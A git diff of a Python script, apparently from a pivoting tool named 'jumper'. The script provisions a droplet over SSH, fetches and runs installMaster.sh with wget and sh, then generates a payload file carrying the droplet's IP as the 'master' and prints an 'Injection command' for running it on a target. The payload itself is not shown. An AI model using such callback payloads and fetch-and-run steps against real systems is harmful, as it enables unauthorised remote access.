@@ -22,16 +22,16 @@ def connectToDroplet(ip, port):
             fails+=1
             print("[!] "+str(e))
             time.sleep(3)
-    try:    
+    try:
         print("[-] Retrieving installMaster.sh")
 
         stdin, stdout, stderr = ssh.exec_command('wget https://raw.githubusercontent.com/needmorecowbell/jumper/master/installMaster.sh')
         time.sleep(5)
         print("[-] Executing installMaster.sh")
-        
+
         stdin, stdout, stderr = ssh.exec_command('sh installMaster.sh')
         print("[+] Commands Executed")
-        time.sleep(5)        
+        time.sleep(5)
         ssh.close()
         print("[+] SSH Client Closed")
     except Exception as e:
@@ -106,7 +106,18 @@ connectToDroplet(ip, 22)
 
 print("[+] Droplet Connected")
 
-print("[+] Injection command:\n\t python3 slaver_singlefile.py -m "+str(ip)+":10000 -t 127.0.0.1:22")
+print("[-] Generating Payload...")
+fileData=""
+with open('payload/payload_template.py','r') as file:
+    fileData= file.read()
+
+fileData=fileData.replace('#MASTER_IP#', str(ip))
+
+with open('payload/payload.py','w') as file:
+    file.write(fileData)
+print("[+] Payload generated (/payload/payload.py)")
+
+print("[+] Injection command:\n\t python payload.py\n\t python3 payload.py")
 
 print("[+] Droplet Connection command:\n\t ssh -i keys/digitaloceanKey root@"+str(ip))
 
